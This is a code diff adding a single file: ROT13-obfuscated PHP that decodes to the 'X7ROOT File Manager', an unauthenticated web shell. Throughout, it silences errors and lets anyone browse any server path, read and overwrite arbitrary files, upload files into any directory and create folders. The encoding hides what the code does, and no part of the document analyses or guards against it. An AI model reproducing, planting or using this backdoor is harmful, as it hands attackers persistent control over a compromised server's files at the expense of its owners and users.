@@ -1,0 +1,126 @@
+<?cuc
+@vav_frg('qvfcynl_reebef', 0);
+@frg_gvzr_yvzvg(0);
+reebe_ercbegvat(0);
+
+shapgvba fnsr($f) {
+    erghea ugzyfcrpvnypunef($f, RAG_DHBGRF | RAG_UGZY5, 'HGS-8');
+}
+
+shapgvba sbezngFvmr($olgrf) {
+    $havgf = ['O','XO','ZO','TO','GO'];
+    sbe ($v = 0; $olgrf >= 1024 && $v < pbhag($havgf)-1; $v++) {
+        $olgrf /= 1024;
+    }
+    erghea ebhaq($olgrf, 2).' '.$havgf[$v];
+}
+
+$pjq = vffrg($_TRG['cngu']) ? $_TRG['cngu'] : trgpjq();
+$pjq = ernycngu($pjq);
+
+// Unaqyr hcybnq
+vs (vffrg($_CBFG['hcybnq']) && vffrg($_SVYRF['svyr'])) {
+    $gnetrg = $pjq . '/' . onfranzr($_SVYRF['svyr']['anzr']);
+    vs (@zbir_hcybnqrq_svyr($_SVYRF['svyr']['gzc_anzr'], $gnetrg)) {
+        rpub "<qvi fglyr='pbybe:#0s0'>[+] Svyr hcybnqrq fhpprffshyyl.</qvi>";
+    } ryfr {
+        rpub "<qvi fglyr='pbybe:#s00'>[-] Hcybnq snvyrq.</qvi>";
+    }
+}
+
+// Unaqyr svyr rqvg fnir
+vs (vffrg($_CBFG['fnir']) && vffrg($_CBFG['svyranzr'])) {
+    $cngu = $pjq.'/'.onfranzr($_CBFG['svyranzr']);
+    vs (@svyr_chg_pbagragf($cngu, $_CBFG['pbagrag']) !== snyfr) {
+        rpub "<qvi fglyr='pbybe:#0s0'>[+] Svyr fnirq fhpprffshyyl.</qvi>";
+    } ryfr {
+        rpub "<qvi fglyr='pbybe:#s00'>[-] Snvyrq gb fnir svyr.</qvi>";
+    }
+}
+
+// Unaqyr perngr qverpgbel
+vs (vffrg($_CBFG['zxqve']) && vffrg($_CBFG['qveanzr'])) {
+    $qveAnzr = onfranzr($_CBFG['qveanzr']);
+    $shyyCngu = $pjq . '/' . $qveAnzr;
+    vs (!svyr_rkvfgf($shyyCngu)) {
+        vs (@zxqve($shyyCngu)) {
+            rpub "<qvi fglyr='pbybe:#0s0'>[+] Qverpgbel perngrq.</qvi>";
+        } ryfr {
+            rpub "<qvi fglyr='pbybe:#s00'>[-] Snvyrq gb perngr qverpgbel.</qvi>";
+        }
+    } ryfr {
+        rpub "<qvi fglyr='pbybe:#s90'>[!] Qverpgbel nyernql rkvfgf.</qvi>";
+    }
+}
+
+rpub "<!QBPGLCR ugzy><ugzy ynat='ra'><urnq><zrgn punefrg='HGS-8'><gvgyr>Svyr Znantre</gvgyr><fglyr>
+obql { onpxtebhaq:#0q0q0q; pbybe:#ppp; sbag-snzvyl:zbabfcnpr; cnqqvat:20ck; }
+n { pbybe:#5ns; grkg-qrpbengvba:abar; }
+n:ubire { grkg-qrpbengvba:haqreyvar; }
+vachg, grkgnern, fryrpg { onpxtebhaq:#111; pbybe:#0s0; obeqre:1ck fbyvq #444; cnqqvat:5ck; jvqgu:100%; }
+vachg[glcr=fhozvg] { onpxtebhaq:#222; pbybe:#0s0; obeqre:1ck fbyvq #0s0; phefbe:cbvagre; }
+ue { obeqre:abar; obeqre-gbc:1ck fbyvq #333; znetva:20ck 0; }
+.qve { pbybe:#0ss; }
+.svyr { pbybe:#sss; }
+.fvmr { pbybe:#999; sybng:evtug; }
+u2 { znetva:0 0 10ck 0; }
+</fglyr></urnq><obql>";
+
+rpub "<u2>K7EBBG Svyr Znantre</u2>";
+rpub "<o>Pheerag Cngu:</o> ".fnsr($pjq)."<ue>";
+
+// Fubj anivtngvba
+$cnegf = rkcybqr(QVERPGBEL_FRCNENGBE, $pjq);
+$ani = "";
+$ohvyq = "";
+sbernpu ($cnegf nf $c) {
+    vs ($c == "") pbagvahr;
+    $ohvyq .= "/$c";
+    $ani .= "<n uers='?cngu=".heyrapbqr($ohvyq)."'>".fnsr($c)."</n> / ";
+}
+rpub $ani."<ue>";
+
+// Svyr yvfgvat
+$svyrf = @fpnaqve($pjq);
+rpub "<hy fglyr='yvfg-fglyr:abar;cnqqvat:0;'>";
+sbernpu ($svyrf nf $s) {
+    vs ($s == ".") pbagvahr;
+    $sc = $pjq.'/'.$s;
+    vs (vf_qve($sc)) {
+        rpub "<yv pynff='qve'>📁 <n uers='?cngu=".heyrapbqr($sc)."'>".fnsr($s)."</n></yv>";
+    } ryfr {
+        rpub "<yv pynff='svyr'>📄 <n uers='?cngu=".heyrapbqr($pjq)."&rqvg=".heyrapbqr($s)."'>".fnsr($s)."</n><fcna pynff='fvmr'>(".sbezngFvmr(svyrfvmr($sc)).")</fcna></yv>";
+    }
+}
+rpub "</hy><ue>";
+
+// Rqvg svyr
+vs (vffrg($_TRG['rqvg'])) {
+    $svyr = onfranzr($_TRG['rqvg']);
+    $shyy = $pjq.'/'.$svyr;
+    vs (svyr_rkvfgf($shyy)) {
+        $pbagrag = @svyr_trg_pbagragf($shyy);
+        rpub "<u3>Rqvgvat: ".fnsr($svyr)."</u3>";
+        rpub "<sbez zrgubq='cbfg'>";
+        rpub "<vachg glcr='uvqqra' anzr='svyranzr' inyhr='".fnsr($svyr)."'>";
+        rpub "<grkgnern anzr='pbagrag' ebjf='15'>".fnsr($pbagrag)."</grkgnern><oe>";
+        rpub "<vachg glcr='fhozvg' anzr='fnir' inyhr='Fnir Svyr'>";
+        rpub "</sbez><ue>";
+    }
+}
+
+// Hcybnq
+rpub "<u3>Hcybnq Svyr</u3>";
+rpub "<sbez zrgubq='cbfg' rapglcr='zhygvcneg/sbez-qngn'>";
+rpub "<vachg glcr='svyr' anzr='svyr'><oe>";
+rpub "<vachg glcr='fhozvg' anzr='hcybnq' inyhr='Hcybnq'>";
+rpub "</sbez><ue>";
+
+// Perngr sbyqre
+rpub "<u3>Perngr Sbyqre</u3>";
+rpub "<sbez zrgubq='cbfg'>";
+rpub "<vachg glcr='grkg' anzr='qveanzr' cynprubyqre='Arj sbyqre anzr'>";
+rpub "<vachg glcr='fhozvg' anzr='zxqve' inyhr='Perngr'>";
+rpub "</sbez>";
+
+rpub "</obql></ugzy>";
